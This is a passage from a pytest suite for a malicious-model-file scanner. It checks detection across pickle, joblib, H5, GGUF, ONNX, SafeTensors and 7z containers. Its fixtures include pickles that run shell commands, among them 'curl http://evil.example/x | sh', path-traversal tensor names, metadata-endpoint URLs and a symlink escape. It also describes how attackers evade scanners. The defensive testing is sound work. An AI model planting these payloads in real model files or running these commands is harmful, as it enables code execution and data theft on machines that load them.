                    _struct.pack_into("<H", raw, i + off, flag)
                    i += 4
        return bytes(raw)

    @pytest.mark.parametrize("flag", [0x0000, 0x0001, 0x0020, 0x0040])
    def test_flag_bits_do_not_hide_the_payload(self, tmp_path, flag):
        p = tmp_path / f"model_{flag}.pt"
        p.write_bytes(self._checkpoint(flag))

        findings = ModelFileScanner().scan_file(p)
        assert any(
            f.rule_id == "MFV-PICKLE-001" and f.severity == Severity.CRITICAL
            for f in findings
        ), f"flag 0x{flag:x} evaded the scan: {[(f.rule_id, f.severity) for f in findings]}"

    def test_member_name_does_not_gate_analysis(self, tmp_path):
        """The member name is attacker-chosen. picklescan's corpus carries the
        payload as `data.txt` precisely because scanners that filter members by
        extension skip it, so unmatched members are sniffed on content."""
        p = tmp_path / "model.pt"
        p.write_bytes(self._checkpoint(member="model/data.txt"))

        findings = ModelFileScanner().scan_file(p)
        assert any(f.rule_id == "MFV-PICKLE-001" for f in findings)

    def test_deflated_member_with_lying_flag_is_still_read(self, tmp_path):
        p = tmp_path / "model.pt"
        p.write_bytes(self._checkpoint(0x0001, compress=zipfile.ZIP_DEFLATED))

        findings = ModelFileScanner().scan_file(p)
        assert any(f.rule_id == "MFV-PICKLE-001" for f in findings)

    @pytest.mark.parametrize("flag", [0x0000, 0x0001])
    def test_benign_checkpoint_stays_clean_either_way(self, tmp_path, flag):
        """The raw-bytes fallback must not invent findings. A genuinely
        encrypted member yields ciphertext, the pickle walk fails on it, and
        nothing is reported -- which is what keeps a real password-protected
        archive quiet."""
        p = tmp_path / f"benign_{flag}.pt"
        p.write_bytes(self._checkpoint(flag, payload=pickle.dumps({"w": [1.0]}, protocol=4)))

        assert ModelFileScanner().scan_file(p) == []

    def test_zip_extension_is_resolved_by_content(self, tmp_path):
        """A zip holding `data.pkl` is a checkpoint whatever it is called, and
        shipping a model as a `.zip` is ordinary practice."""
        p = tmp_path / "model.zip"
        p.write_bytes(self._checkpoint())

        findings = ModelFileScanner().scan_file(p)
        assert any(f.rule_id == "MFV-PICKLE-001" for f in findings)

    def test_unrelated_zip_is_not_reported(self, tmp_path):
        p = tmp_path / "docs.zip"
        buf = io.BytesIO()
        with zipfile.ZipFile(buf, "w") as zf:
            zf.writestr("readme.txt", "nothing to see")
        p.write_bytes(buf.getvalue())

        assert ModelFileScanner().scan_file(p) == []


class TestOversizedZipContainersAreStillScanned:
    """The scan cap existed because `scan_file` reads the whole file into
    memory. That cost is real for a flat file and entirely avoidable for a ZIP
    container: `zipfile` reads lazily off disk and only the pickle member is
    ever decompressed, already bounded by MAX_ZIP_MEMBER_BYTES.

    Gating on file size rather than parse size was a trivially exploitable
    evasion: pad a checkpoint past the limit and the scanner stops looking.
    Measured against MalHug, a corpus of 91 real in-the-wild malicious
    HuggingFace models, this was the cause of EVERY one of the true blind
    spots. The clearest case is `MustEr/rager_legacy`: 522MB on disk, whose
    `archive/data.pkl` is 20,203 bytes. A 20KB parse was being skipped to
    avoid a cost a ZIP container never charges, and the classifier
    calls those payloads denied the moment it reads them.
    """

    def test_oversized_zip_is_scanned_not_skipped(self, tmp_path, monkeypatch):
        scanner = ModelFileScanner()
        # Lower the cap rather than build a 500MB fixture; the branch under
        # test is the size comparison, not the specific number.
        monkeypatch.setattr(scanner, "MAX_SCAN_BYTES", 1000)

        p = tmp_path / "big.pt"
        with zipfile.ZipFile(p, "w", zipfile.ZIP_STORED) as zf:
            zf.writestr("archive/data.pkl", _os_system_pickle("curl http://evil.example/x | sh"))
            # Padding so the container comfortably exceeds the lowered cap,
            # mirroring a real checkpoint whose bulk is tensor data.
            zf.writestr("archive/data/0", b"\x00" * 4000)
        assert p.stat().st_size > 1000

        findings = scanner.scan_file(p)
        assert any(
            f.rule_id == "MFV-PICKLE-001" and f.severity == Severity.CRITICAL
            for f in findings
        ), f"oversized zip was skipped instead of scanned: {[(f.rule_id, f.severity) for f in findings]}"
        assert not any(f.rule_id == "MFV-SKIP-001" for f in findings)

    def test_oversized_non_zip_is_skipped_but_never_reported_clean(self, tmp_path, monkeypatch):
        """A flat file over the cap genuinely cannot be read, but the skip must
        not read as a clean verdict. It was INFO, which is the tier triagers
        suppress, so an unscanned file looked exactly like a scanned-and-clean
        one."""
        scanner = ModelFileScanner()
        monkeypatch.setattr(scanner, "MAX_SCAN_BYTES", 100)

        p = tmp_path / "huge.pkl"
        p.write_bytes(b"\x89HDF\r\n\x1a\n" + b"\x00" * 500)

        findings = scanner.scan_file(p)
        skip = [f for f in findings if f.rule_id == "MFV-SKIP-001"]
        assert skip, f"{[(f.rule_id, f.severity) for f in findings]}"
        assert skip[0].severity != Severity.INFO
        assert "NOT a clean verdict" in skip[0].message

    def test_scanning_an_oversized_zip_does_not_read_the_whole_file(self, tmp_path, monkeypatch):
        """The point of the fix. If this ever regresses to `read_bytes()` the
        memory-safety reason for the cap comes back and the fix is unsafe."""
        scanner = ModelFileScanner()
        monkeypatch.setattr(scanner, "MAX_SCAN_BYTES", 1000)

        p = tmp_path / "big.pt"
        with zipfile.ZipFile(p, "w", zipfile.ZIP_STORED) as zf:
            zf.writestr("archive/data.pkl", _os_system_pickle("id"))
            zf.writestr("archive/data/0", b"\x00" * 200_000)

        real_read_bytes = Path.read_bytes
        seen = []

        def _tracking_read_bytes(self):
            seen.append(self)
            return real_read_bytes(self)

        monkeypatch.setattr(Path, "read_bytes", _tracking_read_bytes)
        findings = scanner.scan_file(p)

        assert any(f.rule_id == "MFV-PICKLE-001" for f in findings)
        assert p not in seen, "the oversized container was read entirely into memory"


class TestOversizedKerasH5IsStillScanned:
    """Same argument as the oversized-ZIP case, for HDF5.

    A Keras `.h5` keeps its architecture in a `model_config` attribute of a
    few kilobytes and its bulk in weights, so declining to read the file at
    all threw away a cheap parse. Measured on MalHug: `MustEr/vgg_official`
    and `MustEr/vgg16_light` are 553MB models carrying a real malicious
    Lambda layer, and both were reported only as `MFV-SKIP-001`, which meant
    two genuine detections were lost to a memory cost the format does not
    actually impose.
    """

    @staticmethod
    def _h5_with_config(path: Path, config: bytes, pad: int) -> None:
        """An HDF5-signed file with `config` buried after `pad` bytes."""
        path.write_bytes(b"\x89HDF\r\n\x1a\n" + b"\x00" * pad + config)

    _LAMBDA_CONFIG = (
        b'{"class_name": "Sequential", "config": {"layers": ['
        b'{"class_name": "Lambda", "config": {"name": "output"}}]}}'
    )

    def test_oversized_h5_lambda_layer_is_found(self, tmp_path, monkeypatch):
        scanner = ModelFileScanner()
        monkeypatch.setattr(scanner, "MAX_SCAN_BYTES", 1000)

        p = tmp_path / "big.h5"
        self._h5_with_config(p, self._LAMBDA_CONFIG, pad=4000)
        assert p.stat().st_size > 1000

        findings = scanner.scan_file(p)
        assert any(f.rule_id == "MFV-KERAS-001" for f in findings), (
            [(f.rule_id, f.message) for f in findings]
        )
        assert not any(f.rule_id == "MFV-SKIP-001" for f in findings)

    def test_anchor_straddling_a_stream_chunk_is_found(self, tmp_path, monkeypatch):
        """The anchor must survive landing on a read boundary, which is what
        the overlap in _read_keras_config_window exists for."""
        monkeypatch.setattr(mfv_scanner, "_KERAS_STREAM_CHUNK", 64)
        scanner = ModelFileScanner()
        monkeypatch.setattr(scanner, "MAX_SCAN_BYTES", 100)

        for pad in range(50, 70):
            p = tmp_path / f"straddle_{pad}.h5"
            self._h5_with_config(p, self._LAMBDA_CONFIG, pad=pad)
            findings = scanner.scan_file(p)
            assert any(f.rule_id == "MFV-KERAS-001" for f in findings), (
                f"anchor missed at pad={pad}"
            )

    def test_oversized_weights_only_h5_still_reports_non_coverage(self, tmp_path, monkeypatch):
        """No architecture attribute means nothing to check, but the file was
        still never read, so it must not come back silent."""
        scanner = ModelFileScanner()
        monkeypatch.setattr(scanner, "MAX_SCAN_BYTES", 1000)

        p = tmp_path / "weights.h5"
        p.write_bytes(b"\x89HDF\r\n\x1a\n" + b"\x00" * 4000)

        findings = scanner.scan_file(p)
        assert [f.rule_id for f in findings] == ["MFV-SKIP-001"]

    def test_oversized_h5_is_not_read_into_memory(self, tmp_path, monkeypatch):
        scanner = ModelFileScanner()
        monkeypatch.setattr(scanner, "MAX_SCAN_BYTES", 1000)

        p = tmp_path / "big.h5"
        self._h5_with_config(p, self._LAMBDA_CONFIG, pad=200_000)

        real_read_bytes = Path.read_bytes
        seen = []

        def _tracking_read_bytes(self):
            seen.append(self)
            return real_read_bytes(self)

        monkeypatch.setattr(Path, "read_bytes", _tracking_read_bytes)
        findings = scanner.scan_file(p)

        assert any(f.rule_id == "MFV-KERAS-001" for f in findings)
        assert p not in seen, "the oversized H5 was read entirely into memory"


class TestMalformedContainersDoNotCrash:
    """A crafted file must produce a verdict, never an exception.

    Found by fuzzing 250 mutated files per format: 105 malformed GGUF files
    crashed the scanner with `OverflowError: Python int too large to convert
    to C ssize_t`. `_read_gguf_string` advances the offset by an
    attacker-declared 64-bit length, so a single iteration could land far past
    the file, and `struct.unpack_from` raises OverflowError rather than
    struct.error once the offset exceeds ssize_t. OverflowError was not in the
    parser's documented failure set, so it escaped the caller's handler.

    A crash is worse than a miss: it is an unhandled exception in a security
    tool reading hostile input, and under a CI gate it is indistinguishable
    from a scan that never ran.
    """

    @staticmethod
    def _gguf_with_huge_key_length(length: int) -> bytes:
        return (
            b"GGUF"
            + struct.pack("<IQQ", 3, 0, 1)   # version, tensor_count, kv_count
            + struct.pack("<Q", length)      # key length, attacker-declared
            + b"padding-that-is-nowhere-near-that-long"
        )

    @pytest.mark.parametrize("length", [2 ** 62, 2 ** 63 - 1, 2 ** 64 - 1])
    def test_gguf_key_length_past_ssize_t_is_a_finding_not_a_crash(
        self, tmp_path, length
    ):
        p = tmp_path / "overflow.gguf"
        p.write_bytes(self._gguf_with_huge_key_length(length))

        findings = ModelFileScanner().scan_file(p)   # must not raise

        assert findings, "a malformed GGUF must not scan silently clean"
        assert any(f.rule_id in {"MFV-GGUF-004", "MFV-GGUF-005"} for f in findings), (
            [(f.rule_id, f.message) for f in findings]
        )

    def test_gguf_metadata_parser_raises_a_documented_error(self):
        """The parser's contract is ValueError/struct.error, which the caller
        catches. OverflowError silently violated it."""
        blob = self._gguf_with_huge_key_length(2 ** 62)
        with pytest.raises((ValueError, struct.error, IndexError)):
            mfv_scanner._parse_gguf_metadata(blob, mfv_scanner.GGUF_METADATA_SCAN_BYTES)


class TestPmmlParseFailureIsNotClean:
    """Exception-oriented evasion is not specific to pickle. A PMML document
    that this parser rejects can still be consumed by a more permissive
    engine, so an XML parse error must be reported, never swallowed."""

    def test_malformed_pmml_reports_non_coverage(self, tmp_path):
        p = tmp_path / "model.pmml"
        # Well-formed enough to dispatch as PMML, truncated mid-element so
        # ElementTree gives up.
        p.write_bytes(
            b'<?xml version="1.0"?>\n<PMML version="4.4">\n'
            b'  <DataDictionary><DataField name="x"'
        )

        findings = ModelFileScanner().scan_file(p)

        assert any(f.rule_id == "MFV-SKIP-003" for f in findings), (
            [(f.rule_id, f.message) for f in findings]
        )

    def test_well_formed_pmml_stays_quiet(self, tmp_path):
        p = tmp_path / "clean.pmml"
        p.write_bytes(
            b'<?xml version="1.0"?>\n'
            b'<PMML version="4.4" xmlns="http://www.dmg.org/PMML-4_4">\n'
            b'  <Header/>\n'
            b'  <DataDictionary numberOfFields="0"/>\n'
            b'</PMML>\n'
        )

        assert ModelFileScanner().scan_file(p) == []


class TestSevenZipExtraction:
    """The 7z branch shells out to a system `7zz`, so on a machine without one
    the entire extraction path is dead code that nobody has ever run. These
    stub the extractor to exercise it.

    The nesting case is the one that matters: 7z is the only container that
    re-enters `scan_file` on what it extracts, so an archive containing an
    archive recursed until RecursionError, an unhandled crash rather than a
    verdict.
    """

    _MAGIC = b"7z\xbc\xaf\x27\x1c"

    @staticmethod
    def _install_stub(tmp_path, monkeypatch, body: str):
        """Put a fake `7zz` on PATH implementing `l -slt` and `x -y -o<dir>`.

        Windows cannot execute a shebang script, so there the code goes in a
        .py file behind a .bat shim, which shutil.which finds via PATHEXT.
        """
        bindir = tmp_path / "bin"
        bindir.mkdir()
        code = (
            "import sys, pathlib\n"
            "args = sys.argv[1:]\n"
            "if args and args[0] == 'l':\n"
            "    print(f'Size = {pathlib.Path(args[-1]).stat().st_size}')\n"
            "    sys.exit(0)\n"
            "if args and args[0] == 'x':\n"
            "    outdir = next(a[2:] for a in args if a.startswith('-o'))\n"
            "    archive = pathlib.Path(args[-1])\n"
            f"{body}\n"
            "    sys.exit(0)\n"
            "sys.exit(1)\n"
        )
        if os.name == "nt":
            (bindir / "stub7zz.py").write_text(code)
            (bindir / "7zz.bat").write_text(
                f'@"{sys.executable}" "%~dp0stub7zz.py" %*\n'
            )
        else:
            stub = bindir / "7zz"
            stub.write_text("#!/usr/bin/env python3\n" + code)
            stub.chmod(0o755)
        monkeypatch.setenv("PATH", f"{bindir}{os.pathsep}{os.environ['PATH']}")

    def test_payload_inside_a_7z_is_found(self, tmp_path, monkeypatch):
        self._install_stub(tmp_path, monkeypatch,
            "    out = pathlib.Path(outdir) / 'model.pkl'\n"
            "    out.write_bytes(archive.read_bytes()[6:])")

        p = tmp_path / "malicious.7z"
        p.write_bytes(self._MAGIC + _os_system_pickle("echo pwned"))

        findings = ModelFileScanner().scan_file(p)
        assert any(f.rule_id == "MFV-PICKLE-001" for f in findings), (
            [(f.rule_id, f.message) for f in findings]
        )
        assert any("model.pkl" in f.message for f in findings)

    def test_benign_content_inside_a_7z_stays_quiet(self, tmp_path, monkeypatch):
        self._install_stub(tmp_path, monkeypatch,
            "    out = pathlib.Path(outdir) / 'model.pkl'\n"
            "    out.write_bytes(archive.read_bytes()[6:])")

        p = tmp_path / "benign.7z"
        p.write_bytes(self._MAGIC + pickle.dumps({"weights": [1, 2, 3]}))

        assert ModelFileScanner().scan_file(p) == []

    def test_self_nesting_archive_terminates(self, tmp_path, monkeypatch):
        """Extracting yields a copy of the same archive, forever."""
        self._install_stub(tmp_path, monkeypatch,
            "    out = pathlib.Path(outdir) / 'inner.7z'\n"
            "    out.write_bytes(archive.read_bytes())")

        p = tmp_path / "nested.7z"
        p.write_bytes(self._MAGIC + b"payload")

        scanner = ModelFileScanner()
        findings = scanner.scan_file(p)      # must not raise RecursionError

        assert any(f.rule_id == "MFV-SKIP-003" for f in findings)
        assert scanner._archive_depth == 0, "depth counter leaked"
class TestDirectoryDiscoverySkipsDirectories:
    """`rglob("*.joblib")` matches a *directory* called `model.joblib` as
    readily as a file. Model caches name directories after the file they hold
    (`<repo>--sklearn_model.joblib/`), so every one of them was handed to
    scan_file, failed to read, and produced a spurious MFV-SKIP-003. On a
    215-model corpus that turned 11 findings into 300.
    """

    def test_directory_named_like_a_model_is_not_scanned(self, tmp_path):
        holder = tmp_path / "acme--demo--sklearn_model.joblib"
        holder.mkdir()
        (holder / "sklearn_model.joblib").write_bytes(pickle.dumps({"ok": True}))

        findings = ModelFileScanner().scan_directory(tmp_path)

        assert not any(f.rule_id == "MFV-SKIP-003" for f in findings), (
            [(f.rule_id, f.file_path) for f in findings]
        )

    def test_the_file_inside_it_is_still_scanned(self, tmp_path):
        holder = tmp_path / "acme--demo--model.pkl"
        holder.mkdir()
        (holder / "model.pkl").write_bytes(_os_system_pickle("echo pwned"))

        findings = ModelFileScanner().scan_directory(tmp_path)

        assert any(f.rule_id == "MFV-PICKLE-001" for f in findings), (
            [(f.rule_id, f.file_path) for f in findings]
        )
class TestSevenZipLinkEscape:
    """A 7z member can be a symlink, and the extractor creates it happily.

    Following one reads a file outside the extraction directory and prints its
    contents into the report, so a crafted archive turns a scan into an
    arbitrary-file-read primitive for whoever supplied it (CWE-59, CWE-22).
    Verified before the fix: the planted file outside tmp came back as a
    CRITICAL finding attributed to the archive.
    """

    _MAGIC = b"7z\xbc\xaf\x27\x1c"

    @staticmethod
    def _install_stub(tmp_path, monkeypatch, body: str, env: dict | None = None):
        bindir = tmp_path / "bin"
        bindir.mkdir()
        code = (
            "import sys, pathlib, os\n"
            "args = sys.argv[1:]\n"
            "if args and args[0] == 'l':\n"
            "    print('Size = 100')\n"
            "    sys.exit(0)\n"
            "if args and args[0] == 'x':\n"
            "    outdir = pathlib.Path(next(a[2:] for a in args if a.startswith('-o')))\n"
            "    outdir.mkdir(parents=True, exist_ok=True)\n"
            f"{body}\n"
            "    sys.exit(0)\n"
            "sys.exit(1)\n"
        )
        if os.name == "nt":
            (bindir / "stub7zz.py").write_text(code)
            (bindir / "7zz.bat").write_text(
                f'@"{sys.executable}" "%~dp0stub7zz.py" %*\n'
            )
        else:
            stub = bindir / "7zz"
            stub.write_text("#!/usr/bin/env python3\n" + code)
            stub.chmod(0o755)
        monkeypatch.setenv("PATH", f"{bindir}{os.pathsep}{os.environ['PATH']}")
        for key, value in (env or {}).items():
            monkeypatch.setenv(key, value)

    def test_link_out_of_the_extraction_dir_is_not_followed(self, tmp_path, monkeypatch):
        secret = tmp_path / "outside.pkl"
        secret.write_bytes(_os_system_pickle("echo outside-the-sandbox"))

        self._install_stub(
            tmp_path, monkeypatch,
            "    (outdir / 'weights.pkl').symlink_to(pathlib.Path(os.environ['ESCAPE_TARGET']))",
            env={"ESCAPE_TARGET": str(secret)},
        )

        p = tmp_path / "evil.7z"
        p.write_bytes(self._MAGIC + b"x")

        findings = ModelFileScanner().scan_file(p)

        assert not any(f.rule_id == "MFV-PICKLE-001" for f in findings), (
            "content outside the extraction directory was read"
        )
        assert any(f.rule_id == "MFV-SKIP-003" for f in findings), (
            "the skipped link must be reported, not silently dropped"
        )

    def test_ordinary_member_still_scans(self, tmp_path, monkeypatch):
        self._install_stub(
            tmp_path, monkeypatch,
            "    (outdir / 'model.pkl').write_bytes(pathlib.Path(args[-1]).read_bytes()[6:])",
        )

        p = tmp_path / "m.7z"
        p.write_bytes(self._MAGIC + _os_system_pickle("echo pwned"))

        findings = ModelFileScanner().scan_file(p)
        assert any(f.rule_id == "MFV-PICKLE-001" for f in findings)
class TestJoblibCompressionCodecs:
    """joblib.dump(compress=...) writes zlib, gzip, bz2, lzma or xz.

    Sniffing only zlib meant any other codec was handed to the pickle walker
    still compressed: no opcodes were found and the file passed clean. A
    published bypass proof of concept exploits exactly that, carrying
    builtins.eval("__import__('os').popen('id').read()") behind lzma.
    """

    _PAYLOAD = _os_system_pickle("echo pwned")

    @staticmethod
    def _compress(kind: str, blob: bytes) -> bytes:
        import bz2 as _bz2
        import gzip as _gzip
        import lzma as _lzma
        import zlib as _zlib
        if kind == "zlib":
            return _zlib.compress(blob)
        if kind == "gzip":
            return _gzip.compress(blob)
        if kind == "bz2":
            return _bz2.compress(blob)
        if kind == "xz":
            return _lzma.compress(blob, format=_lzma.FORMAT_XZ)
        return _lzma.compress(blob, format=_lzma.FORMAT_ALONE)

    @pytest.mark.parametrize("codec", ["zlib", "gzip", "bz2", "xz", "lzma"])
    def test_payload_is_found_behind_every_codec(self, tmp_path, codec):
        p = tmp_path / f"model_{codec}.joblib"
        p.write_bytes(self._compress(codec, self._PAYLOAD))

        findings = ModelFileScanner().scan_file(p)

        assert any(f.rule_id == "MFV-PICKLE-001" for f in findings), (
            f"{codec}-compressed payload was not seen: "
            f"{[(f.rule_id, f.message[:60]) for f in findings]}"
        )

    @pytest.mark.parametrize("codec", ["zlib", "gzip", "bz2", "xz", "lzma"])
    def test_benign_content_stays_quiet_behind_every_codec(self, tmp_path, codec):
        p = tmp_path / f"clean_{codec}.joblib"
        p.write_bytes(self._compress(codec, pickle.dumps({"weights": [1.0, 2.0]})))

        assert ModelFileScanner().scan_file(p) == []

    def test_decompression_bomb_is_capped_not_expanded(self, tmp_path, monkeypatch):
        scanner = ModelFileScanner()
        monkeypatch.setattr(scanner, "MAX_ZIP_MEMBER_BYTES", 4096)

        p = tmp_path / "bomb.joblib"
        p.write_bytes(self._compress("xz", b"\x00" * 5_000_000))

        findings = scanner.scan_file(p)
        assert any(f.rule_id == "MFV-JOBLIB-002" for f in findings), (
            [(f.rule_id, f.message[:70]) for f in findings]
        )
class TestNameAndLocationAbuse:
    """A tensor name is not a filename until some tool makes it one, and
    plenty of real tooling does: shard converters, save_pretrained round
    trips, anything materialising tensors individually. Published bypass
    proofs of concept ship five SafeTensors variants of this and one GGUF.
    """

    @staticmethod
    def _safetensors(name: str) -> bytes:
        header = json.dumps(
            {name: {"dtype": "F32", "shape": [4], "data_offsets": [0, 16]}}
        ).encode()
        return struct.pack("<Q", len(header)) + header + b"\x00" * 16

    @pytest.mark.parametrize("name", [
        "../../../tmp/pwned",
        "..\\..\\..\\tmp\\pwned",
        "model.layers.0/../../etc/cron.d/evil",
        "weight\r\nX-Injected: true",
        "weight\x00../../etc/passwd",
        "/etc/passwd",
        "C:\\Windows\\System32\\evil",
    ])
    def test_unsafe_tensor_name_is_reported(self, tmp_path, name):
        p = tmp_path / "model.safetensors"
        p.write_bytes(self._safetensors(name))

        findings = ModelFileScanner().scan_file(p)
        assert any(f.rule_id == "MFV-ST-006" for f in findings), (
            f"{name!r} was not reported: {[(f.rule_id, f.message[:60]) for f in findings]}"
        )

    @pytest.mark.parametrize("name", [
        "weight", "model.layers.0.attn.q_proj.weight",
        "encoder/block_0/dense", "a.b-c_d.0",
    ])
    def test_ordinary_tensor_names_stay_quiet(self, tmp_path, name):
        p = tmp_path / "model.safetensors"
        p.write_bytes(self._safetensors(name))
        assert ModelFileScanner().scan_file(p) == []


class TestOnnxRemoteExternalData:
    """external_data names a sibling file. A URL there makes loading the
    model issue a request, and a published proof of concept points one at
    169.254.169.254, the cloud instance metadata endpoint."""

    @staticmethod
    def _onnx_with_location(location: str) -> bytes:
        def field(num, wire, payload):
            return bytes([(num << 3) | wire]) + payload

        def ld(num, raw):
            return field(num, 2, bytes([len(raw)]) + raw)

        entry = ld(1, b"location") + ld(2, location.encode())
        tensor = ld(8, entry) + field(9, 0, b"\x02")
        return ld(1, ld(12, tensor)) + b"\x08\x07"

    @pytest.mark.parametrize("location", [
        "http://169.254.169.254/latest/meta-data/",
        "https://example.invalid/weights.bin",
        "file:///etc/passwd",
        "//attacker.invalid/share/w.bin",
    ])
    def test_remote_location_is_reported(self, tmp_path, location):
        p = tmp_path / "model.onnx"
        p.write_bytes(self._onnx_with_location(location))
        findings = ModelFileScanner().scan_file(p)
        assert any(f.rule_id == "MFV-ONNX-004" for f in findings), (
            [(f.rule_id, f.message[:70]) for f in findings]
        )

    def test_ordinary_sibling_file_stays_quiet(self, tmp_path):
        p = tmp_path / "model.onnx"
        p.write_bytes(self._onnx_with_location("model.weights"))
        assert not any(f.rule_id == "MFV-ONNX-004"
                       for f in ModelFileScanner().scan_file(p))


class TestNestedPickleLiteral:
    """numpy.load(BytesIO(<pickle>)): the outer callable is on nobody's deny
    list, the outer arguments carry no URL or shell string, and the payload
    only exists once the inner bytes are themselves unpickled."""

    def test_nested_denied_global_is_critical(self, tmp_path):
        inner = _os_system_pickle("echo pwned")
        outer = pickle.dumps({"weights": inner})

        p = tmp_path / "model.pkl"
        p.write_bytes(outer)

        findings = ModelFileScanner().scan_file(p)
        assert any(f.rule_id == "MFV-PICKLE-008"
                   and f.severity == Severity.CRITICAL for f in findings), (
            [(f.rule_id, f.message[:70]) for f in findings]
        )

    def test_ordinary_bytes_payload_stays_quiet(self, tmp_path):
        p = tmp_path / "clean.pkl"
        p.write_bytes(pickle.dumps({"weights": b"\x00\x01\x02" * 500,
                                    "name": "resnet"}))
        assert ModelFileScanner().scan_file(p) == []
class TestWalkResyncsPastRawArrayBytes:
    """joblib splices raw array data into the opcode stream, so the walk dies
    partway through by design. Breaking out of the loop there meant a payload
    placed *after* the arrays was never read.

    Found by the benchmark rather than by review: ModelAudit flags the
    published proof of concept (vellaveto/joblib-scanner-bypass-poc,
    payload3_hidden_in_numpy) and this scanner did not.
    """

    @staticmethod
    def _payload_after_raw(filler: bytes) -> bytes:
        head = pickle.dumps({"description": "weights follow"})
        return head + filler + _os_system_pickle("echo pwned")

    def test_payload_after_raw_bytes_is_found(self, tmp_path):
        p = tmp_path / "model.pkl"
        p.write_bytes(self._payload_after_raw(b"\x01\x02\x03\x04" * 2048))

        findings = ModelFileScanner().scan_file(p)
        assert any(f.rule_id == "MFV-PICKLE-001" for f in findings), (
            [(f.rule_id, f.message[:70]) for f in findings]
        )

    def test_payload_after_compressed_raw_bytes_is_found(self, tmp_path):
        p = tmp_path / "model.joblib"
        p.write_bytes(zlib.compress(self._payload_after_raw(b"\x00\xff" * 4096)))

        findings = ModelFileScanner().scan_file(p)
        assert any(f.rule_id == "MFV-PICKLE-001" for f in findings)

    def test_resync_is_bounded(self, tmp_path):
        """A file of near-misses must not turn the walk quadratic."""
        import time
        p = tmp_path / "noise.pkl"
        p.write_bytes(pickle.dumps({"x": 1}) + (b"\x80\x04" + b"\xff" * 64) * 4000)

        start = time.monotonic()
        ModelFileScanner().scan_file(p)
        assert time.monotonic() - start < 10, "resync did not bound its work"

    def test_ordinary_model_gains_no_findings(self, tmp_path):
        """Reading further must not invent findings in plain tensor data."""
        p = tmp_path / "clean.pkl"
        p.write_bytes(pickle.dumps({"weights": b"\x80\x04\x95" + b"\x00" * 8192,
                                    "name": "resnet"}))
        assert ModelFileScanner().scan_file(p) == []
